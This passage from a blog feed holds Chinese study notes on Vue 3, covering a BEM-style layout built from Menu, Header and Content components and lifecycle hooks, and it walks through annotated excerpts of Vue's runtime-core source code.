<h1 id="Layout布局"><a href="#Layout布局" class="headerlink" title="Layout布局"></a>Layout布局</h1><p>用BEM架构简单实现Element+的Layout布局。</p>
<p>创建scss全局混入（BEM实现代码见上）：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@mixin</span> bfc &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>App.vue中引入布局：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;Layout&gt;&lt;/Layout&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import Layout from &quot;./Layout/index.vue&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">// scoped：给样式制定一个作用域，让它只在该文件里生效</span><br><span class="line">// App.vue中一般不加scoped</span><br><span class="line"></span><br><span class="line">#app &#123;</span><br><span class="line">  @include bfc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>该布局的文件路径：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305182112063.png"></p>
<p>index.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;cheriko-box&quot;&gt;</span><br><span class="line">    &lt;div&gt;&lt;Menu&gt;&lt;/Menu&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;cheriko-box__right&quot;&gt;</span><br><span class="line">      &lt;Header&gt;&lt;/Header&gt;</span><br><span class="line">      &lt;Content&gt;&lt;/Content&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import Menu from &quot;./Menu/index.vue&quot;</span><br><span class="line">import Header from &quot;./Header/index.vue&quot;</span><br><span class="line">import Content from &quot;./Content/index.vue&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">@include b(box) &#123;</span><br><span class="line">  @include bfc;</span><br><span class="line">  display: flex;</span><br><span class="line">  @include e(right) &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    flex-direction: column;</span><br><span class="line">    flex: 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>Content：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;cheriko-content&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;cheriko-content__items&quot; v-for=&quot;item in 100&quot; :key=&quot;item&quot;&gt;</span><br><span class="line">      &#123;&#123; item &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">@include b(content) &#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  overflow: auto;</span><br><span class="line">  @include e(items) &#123;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    margin: 10px;</span><br><span class="line">    border: 1px solid #ccc;</span><br><span class="line">    border-radius: 4px;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>Header：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;cheriko-header&quot;&gt;</span><br><span class="line">    Header</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">@include b(header) &#123;</span><br><span class="line">  height: 50px;</span><br><span class="line">  border-bottom: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>Menu：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;cheriko-menu&quot;&gt;</span><br><span class="line">    Menu</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">@include b(menu) &#123;</span><br><span class="line">  height: 100%;</span><br><span class="line">  min-width: 200px;</span><br><span class="line">  border-right: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>组件＆Vue3生命周期</title>
    <url>/web/study/Vue/12.%E7%BB%84%E4%BB%B6%EF%BC%86Vue3%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><p>每一个<code>.vue</code>文件都可以充当组件使用，每一个组件都可以复用。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305181518701.png"></p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;1145141919810&lt;/h1&gt;</span><br><span class="line">    &lt;!-- 组件可以进行复用，还可以做循环、嵌套、传参 --&gt;</span><br><span class="line">    &lt;A&gt;&lt;/A&gt;</span><br><span class="line">    &lt;A&gt;&lt;/A&gt;</span><br><span class="line">    &lt;A&gt;&lt;/A&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">// 不能和html标签名起冲突</span><br><span class="line">// import div from &quot;@/components/A.vue&quot;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line"></span><br><span class="line">// 在Vue2中需要通过components选项对组件进行注册，但Vue3中不需要（开箱即用）</span><br><span class="line">// component: &#123;</span><br><span class="line">// A</span><br><span class="line">// &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;p&gt;我是一个组件&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Vue3生命周期"><a href="#Vue3生命周期" class="headerlink" title="Vue3生命周期"></a>Vue3生命周期</h1><p>一个组件从创建到销毁的全过程。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305181642173.png"></p>
<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;1145141919810&lt;/h1&gt;</span><br><span class="line">    &lt;!-- 当组件绑定了v-if，flag值变化时会触发组件的创建或销毁，而v-show不会 --&gt;</span><br><span class="line">    &lt;A v-if=&quot;flag&quot;&gt;&lt;/A&gt;</span><br><span class="line">    &lt;A v-if=&quot;flag&quot;&gt;&lt;/A&gt;</span><br><span class="line">    &lt;button @click=&quot;flag=!flag&quot;&gt;创建/销毁&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &quot;vue&quot;</span><br><span class="line">import A from &quot;@/components/A.vue&quot;</span><br><span class="line">const flag = ref&lt;Boolean&gt;(false)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>A.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;p&gt;我是一个组件&lt;/p&gt;</span><br><span class="line">    &lt;div ref=&quot;div&quot;&gt;&#123;&#123; str &#125;&#125;&lt;/div&gt;</span><br><span class="line">    &lt;button @click=&quot;change&quot;&gt;修改str&lt;/button&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">// 在setup语法糖模式中没有beforeCreate和created（因为相当于setup）</span><br><span class="line">import &#123; getCurrentInstance, ref, onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted, onRenderTracked, onRenderTriggered &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const str = ref&lt;string&gt;(&quot;野兽先辈&quot;)</span><br><span class="line">const div = ref&lt;HTMLDivElement&gt;()</span><br><span class="line">const instance = getCurrentInstance()</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  str.value = str.value + 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 在setup时还读不到任何DOM元素</span><br><span class="line">// 可以看到这些生命周期函数都被注册到组件实例上了</span><br><span class="line">console.log(&quot;setup&quot;, div.value, instance)</span><br><span class="line"></span><br><span class="line">// 挂载前</span><br><span class="line">onBeforeMount(()=&gt; &#123;</span><br><span class="line">  // 在onBeforeMount时还读不到任何DOM元素</span><br><span class="line">  console.log(&quot;onBeforeMount&quot;, div.value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 挂载后</span><br><span class="line">onMounted(()=&gt; &#123;</span><br><span class="line">  // 从onMounted开始能读到DOM元素了</span><br><span class="line">  console.log(&quot;onMounted&quot;, div.value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 更新前</span><br><span class="line">onBeforeUpdate(()=&gt; &#123;</span><br><span class="line">  // 在onBeforeUpdate时DOM元素还未被更新</span><br><span class="line">  console.log(&quot;onBeforeUpdate&quot;, div.value?.innerText)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 更新后</span><br><span class="line">onUpdated(()=&gt; &#123;</span><br><span class="line">  // 从onUpdated开始DOM元素已被更新了</span><br><span class="line">  console.log(&quot;onUpdated&quot;, div.value?.innerText)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 销毁前</span><br><span class="line">onBeforeUnmount(()=&gt; &#123;</span><br><span class="line">  // 在onBeforeUnmount时还能读到DOM元素</span><br><span class="line">  console.log(&quot;onBeforeUnmount&quot;, div.value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 销毁后</span><br><span class="line">onUnmounted(()=&gt; &#123;</span><br><span class="line">  // 从onUnmounted开始组件已经被销毁了，自然读不到DOM元素了</span><br><span class="line">  console.log(&quot;onUnmounted&quot;, div.value)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 收集依赖时</span><br><span class="line">onRenderTracked((e)=&gt; &#123;</span><br><span class="line">  // 用来调试代码，e其实就是一个effect对象</span><br><span class="line">  console.log(&quot;onRenderTracked&quot;, e)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 更新依赖时</span><br><span class="line">onRenderTriggered((e)=&gt; &#123;</span><br><span class="line">  // 用来调试代码，e其实就是一个effect对象</span><br><span class="line">  console.log(&quot;onRenderTriggered&quot;, e)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-core/src/apiLifecycle.ts</code>）中可以看到watch的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在这个函数里创建钩子并作缓存</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">injectHook</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="keyword">type</span>: LifecycleHooks,</span></span><br><span class="line"><span class="params">  hook: <span class="built_in">Function</span> &amp; &#123; __weh?: <span class="built_in">Function</span> &#125;,</span></span><br><span class="line"><span class="params">  target: ComponentInternalInstance | <span class="literal">null</span> = currentInstance,</span></span><br><span class="line"><span class="params">  prepend: <span class="built_in">boolean</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Function</span> | <span class="literal">undefined</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (target) &#123;</span><br><span class="line">    <span class="comment">// 如果有钩子函数直接返回，否则创建一个空数组（Function类型数组）</span></span><br><span class="line">    <span class="keyword">const</span> hooks = target[<span class="keyword">type</span>] || (target[<span class="keyword">type</span>] = [])</span><br><span class="line">    <span class="comment">// cache the error handling wrapper for injected hooks so the same hook</span></span><br><span class="line">    <span class="comment">// can be properly deduped by the scheduler. &quot;__weh&quot; stands for &quot;with error</span></span><br><span class="line">    <span class="comment">// handling&quot;.</span></span><br><span class="line">    <span class="keyword">const</span> wrappedHook =</span><br><span class="line">      hook.<span class="property">__weh</span> ||</span><br><span class="line">      (hook.<span class="property">__weh</span> = <span class="function">(<span class="params">...args: <span class="built_in">unknown</span>[]</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 如果组件卸载了，什么都不做</span></span><br><span class="line">        <span class="keyword">if</span> (target.<span class="property">isUnmounted</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// disable tracking inside all lifecycle hooks</span></span><br><span class="line">        <span class="comment">// since they can potentially be called inside effects.</span></span><br><span class="line">        <span class="comment">// 停止依赖收集，避免重复收集依赖（在组件初始化时就收集过依赖了）</span></span><br><span class="line">        <span class="title function_">pauseTracking</span>()</span><br><span class="line">        <span class="comment">// Set currentInstance during hook invocation.</span></span><br><span class="line">        <span class="comment">// This assumes the hook does not synchronously trigger other hooks, which</span></span><br><span class="line">        <span class="comment">// can only be false when the user does something really funky.</span></span><br><span class="line">        <span class="comment">// 设target为当前组件实例</span></span><br><span class="line">        <span class="title function_">setCurrentInstance</span>(target)</span><br><span class="line">        <span class="comment">// 执行钩子函数</span></span><br><span class="line">        <span class="keyword">const</span> res = <span class="title function_">callWithAsyncErrorHandling</span>(hook, target, <span class="keyword">type</span>, args)</span><br><span class="line">        <span class="comment">// 清空当前组件实例</span></span><br><span class="line">        <span class="title function_">unsetCurrentInstance</span>()</span><br><span class="line">        <span class="comment">// 恢复依赖收集</span></span><br><span class="line">        <span class="title function_">resetTracking</span>()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">      &#125;)</span><br><span class="line">    <span class="keyword">if</span> (prepend) &#123;</span><br><span class="line">      hooks.<span class="title function_">unshift</span>(wrappedHook)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 添加hook</span></span><br><span class="line">      hooks.<span class="title function_">push</span>(wrappedHook)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> wrappedHook</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">    <span class="keyword">const</span> apiName = <span class="title function_">toHandlerKey</span>(<span class="title class_">ErrorTypeStrings</span>[<span class="keyword">type</span>].<span class="title function_">replace</span>(<span class="regexp">/ hook$/</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="title function_">warn</span>(</span><br><span class="line">      <span class="string">`<span class="subst">$&#123;apiName&#125;</span> is called when there is no active component instance to be `</span> +</span><br><span class="line">        <span class="string">`associated with. `</span> +</span><br><span class="line">        <span class="string">`Lifecycle injection APIs can only be used during execution of setup().`</span> +</span><br><span class="line">        (__FEATURE_SUSPENSE__</span><br><span class="line">          ? <span class="string">` If you are using async setup(), make sure to register lifecycle `</span> +</span><br><span class="line">            <span class="string">`hooks before the first await statement.`</span></span><br><span class="line">          : <span class="string">``</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册生命周期，使用函数柯里化封装，因为此处只是第一个参数不同，其他的都相同</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> createHook =</span><br><span class="line">  &lt;T <span class="keyword">extends</span> <span class="title class_">Function</span> = <span class="function">() =&gt;</span> <span class="built_in">any</span>&gt;<span class="function">(<span class="params">lifecycle: LifecycleHooks</span>) =&gt;</span></span><br><span class="line">  <span class="function">(<span class="params">hook: T, target: ComponentInternalInstance | <span class="literal">null</span> = currentInstance</span>) =&gt;</span></span><br><span class="line">    <span class="comment">// post-create lifecycle registrations are noops during SSR (except for serverPrefetch)</span></span><br><span class="line">    (!isInSSRComponentSetup || lifecycle === <span class="title class_">LifecycleHooks</span>.<span class="property">SERVER_PREFETCH</span>) &amp;&amp;</span><br><span class="line">    <span class="title function_">injectHook</span>(lifecycle, <span class="function">(<span class="params">...args: <span class="built_in">unknown</span>[]</span>) =&gt;</span> <span class="title function_">hook</span>(...args), target)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出一些钩子函数，它们都调用了createHook函数，并传入一个参数（枚举）</span></span><br><span class="line"><span class="comment">// 因为生命周期钩子函数是在组件生命周期的各个阶段去执行的，所以把这些钩子放到组件实例上</span></span><br><span class="line"><span class="comment">// export const enum LifecycleHooks &#123;</span></span><br><span class="line"><span class="comment">//   BEFORE_CREATE = &#x27;bc&#x27;,</span></span><br><span class="line"><span class="comment">//   CREATED = &#x27;c&#x27;,</span></span><br><span class="line"><span class="comment">//   BEFORE_MOUNT = &#x27;bm&#x27;,</span></span><br><span class="line"><span class="comment">//   MOUNTED = &#x27;m&#x27;,</span></span><br><span class="line"><span class="comment">//   BEFORE_UPDATE = &#x27;bu&#x27;,</span></span><br><span class="line"><span class="comment">//   UPDATED = &#x27;u&#x27;,</span></span><br><span class="line"><span class="comment">//   BEFORE_UNMOUNT = &#x27;bum&#x27;,</span></span><br><span class="line"><span class="comment">//   UNMOUNTED = &#x27;um&#x27;,</span></span><br><span class="line"><span class="comment">//   DEACTIVATED = &#x27;da&#x27;,</span></span><br><span class="line"><span class="comment">//   ACTIVATED = &#x27;a&#x27;,</span></span><br><span class="line"><span class="comment">//   RENDER_TRIGGERED = &#x27;rtg&#x27;,</span></span><br><span class="line"><span class="comment">//   RENDER_TRACKED = &#x27;rtc&#x27;,</span></span><br><span class="line"><span class="comment">//   ERROR_CAPTURED = &#x27;ec&#x27;,</span></span><br><span class="line"><span class="comment">//   SERVER_PREFETCH = &#x27;sp&#x27;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> onBeforeMount = <span class="title function_">createHook</span>(<span class="title class_">LifecycleHooks</span>.<span class="property">BEFORE_MOUNT</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> onMounted = <span class="title function_">createHook</span>(<span class="title class_">LifecycleHooks</span>.<span class="property">MOUNTED</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> onBeforeUpdate = <span class="title function_">createHook</span>(<span class="title class_">LifecycleHooks</span>.<span class="property">BEFORE_UPDATE</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> onUpdated = <span class="title function_">createHook</span>(<span class="title class_">LifecycleHooks</span>.<span class="property">UPDATED</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> onBeforeUnmount = <span class="title function_">createHook</span>(<span class="title class_">LifecycleHooks</span>.<span class="property">BEFORE_UNMOUNT</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> onUnmounted = <span class="title function_">createHook</span>(<span class="title class_">LifecycleHooks</span>.<span class="property">UNMOUNTED</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> onServerPrefetch = <span class="title function_">createHook</span>(<span class="title class_">LifecycleHooks</span>.<span class="property">SERVER_PREFETCH</span>)</span><br></pre></td></tr></table></figure>

<p>钩子被注册后，在<code>/package/runtime-core/src/render.ts</code>的一些生命周期对应阶段会调用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 挂载和更新</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">setupRenderEffect</span>: <span class="title class_">SetupRenderEffectFn</span> = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">    instance,</span></span></span><br><span class="line"><span class="params"><span class="function">    initialVNode,</span></span></span><br><span class="line"><span class="params"><span class="function">    container,</span></span></span><br><span class="line"><span class="params"><span class="function">    anchor,</span></span></span><br><span class="line"><span class="params"><span class="function">    parentSuspense,</span></span></span><br><span class="line"><span class="params"><span class="function">    isSVG,</span></span></span><br><span class="line"><span class="params"><span class="function">    optimized</span></span></span><br><span class="line"><span class="params"><span class="function">  </span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">componentUpdateFn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">      <span class="comment">// 如果当前组件没有挂载</span></span><br><span class="line">      <span class="keyword">if</span> (!instance.<span class="property">isMounted</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">vnodeHook</span>: <span class="title class_">VNodeHook</span> | <span class="literal">null</span> | <span class="literal">undefined</span></span><br><span class="line">        <span class="keyword">const</span> &#123; el, props &#125; = initialVNode</span><br><span class="line">        <span class="keyword">const</span> &#123; bm, m, parent &#125; = instance</span><br><span class="line">        <span class="keyword">const</span> isAsyncWrapperVNode = <span class="title function_">isAsyncWrapper</span>(initialVNode)</span><br><span class="line"></span><br><span class="line">        <span class="title function_">toggleRecurse</span>(instance, <span class="literal">false</span>)</span><br><span class="line">        <span class="comment">// beforeMount hook</span></span><br><span class="line">        <span class="comment">// 执行beforeMount钩子</span></span><br><span class="line">        <span class="keyword">if</span> (bm) &#123;</span><br><span class="line">          <span class="title function_">invokeArrayFns</span>(bm)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// onVnodeBeforeMount</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          !isAsyncWrapperVNode &amp;&amp;</span><br><span class="line">          (vnodeHook = props &amp;&amp; props.<span class="property">onVnodeBeforeMount</span>)</span><br><span class="line">        ) &#123;</span><br><span class="line">          <span class="title function_">invokeVNodeHook</span>(vnodeHook, parent, initialVNode)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          __COMPAT__ &amp;&amp;</span><br><span class="line">          <span class="title function_">isCompatEnabled</span>(<span class="title class_">DeprecationTypes</span>.<span class="property">INSTANCE_EVENT_HOOKS</span>, instance)</span><br><span class="line">        ) &#123;</span><br><span class="line">          instance.<span class="title function_">emit</span>(<span class="string">&#x27;hook:beforeMount&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">toggleRecurse</span>(instance, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行完beforeMount钩子后进行渲染</span></span><br><span class="line">        <span class="keyword">if</span> (el &amp;&amp; hydrateNode) &#123;</span><br><span class="line">          <span class="comment">// vnode has adopted host node - perform hydration instead of mount.</span></span><br><span class="line">          <span class="keyword">const</span> <span class="title function_">hydrateSubTree</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">              <span class="title function_">startMeasure</span>(instance, <span class="string">`render`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            instance.<span class="property">subTree</span> = <span class="title function_">renderComponentRoot</span>(instance)</span><br><span class="line">            <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">              <span class="title function_">endMeasure</span>(instance, <span class="string">`render`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">              <span class="title function_">startMeasure</span>(instance, <span class="string">`hydrate`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            hydrateNode!(</span><br><span class="line">              el <span class="keyword">as</span> <span class="title class_">Node</span>,</span><br><span class="line">              instance.<span class="property">subTree</span>,</span><br><span class="line">              instance,</span><br><span class="line">              parentSuspense,</span><br><span class="line">              <span class="literal">null</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">              <span class="title function_">endMeasure</span>(instance, <span class="string">`hydrate`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (isAsyncWrapperVNode) &#123;</span><br><span class="line">            ;(initialVNode.<span class="property">type</span> <span class="keyword">as</span> <span class="title class_">ComponentOptions</span>).<span class="property">__asyncLoader</span>!().<span class="title function_">then</span>(</span><br><span class="line">              <span class="comment">// note: we are moving the render call into an async callback,</span></span><br><span class="line">              <span class="comment">// which means it won&#x27;t track dependencies - but it&#x27;s ok because</span></span><br><span class="line">              <span class="comment">// a server-rendered async wrapper is already in resolved state</span></span><br><span class="line">              <span class="comment">// and it will never need to change.</span></span><br><span class="line">              <span class="function">() =&gt;</span> !instance.<span class="property">isUnmounted</span> &amp;&amp; <span class="title function_">hydrateSubTree</span>()</span><br><span class="line">            )</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">hydrateSubTree</span>()</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">            <span class="title function_">startMeasure</span>(instance, <span class="string">`render`</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">const</span> subTree = (instance.<span class="property">subTree</span> = <span class="title function_">renderComponentRoot</span>(instance))</span><br><span class="line">          <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">            <span class="title function_">endMeasure</span>(instance, <span class="string">`render`</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">            <span class="title function_">startMeasure</span>(instance, <span class="string">`patch`</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 挂载Vnode到容器中</span></span><br><span class="line">          <span class="title function_">patch</span>(</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            subTree,</span><br><span class="line">            container,</span><br><span class="line">            anchor,</span><br><span class="line">            instance,</span><br><span class="line">            parentSuspense,</span><br><span class="line">            isSVG</span><br><span class="line">          )</span><br><span class="line">          <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">            <span class="title function_">endMeasure</span>(instance, <span class="string">`patch`</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// el是DOM元素，此时已经可以读到它了</span></span><br><span class="line">          initialVNode.<span class="property">el</span> = subTree.<span class="property">el</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// mounted hook</span></span><br><span class="line">        <span class="comment">// 执行mounted钩子</span></span><br><span class="line">        <span class="keyword">if</span> (m) &#123;</span><br><span class="line">          <span class="title function_">queuePostRenderEffect</span>(m, parentSuspense)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// onVnodeMounted</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          !isAsyncWrapperVNode &amp;&amp;</span><br><span class="line">          (vnodeHook = props &amp;&amp; props.<span class="property">onVnodeMounted</span>)</span><br><span class="line">        ) &#123;</span><br><span class="line">          <span class="keyword">const</span> scopedInitialVNode = initialVNode</span><br><span class="line">          <span class="title function_">queuePostRenderEffect</span>(</span><br><span class="line">            <span class="function">() =&gt;</span> <span class="title function_">invokeVNodeHook</span>(vnodeHook!, parent, scopedInitialVNode),</span><br><span class="line">            parentSuspense</span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          __COMPAT__ &amp;&amp;</span><br><span class="line">          <span class="title function_">isCompatEnabled</span>(<span class="title class_">DeprecationTypes</span>.<span class="property">INSTANCE_EVENT_HOOKS</span>, instance)</span><br><span class="line">        ) &#123;</span><br><span class="line">          <span class="title function_">queuePostRenderEffect</span>(</span><br><span class="line">            <span class="function">() =&gt;</span> instance.<span class="title function_">emit</span>(<span class="string">&#x27;hook:mounted&#x27;</span>),</span><br><span class="line">            parentSuspense</span><br><span class="line">          )</span><br><span class="line">        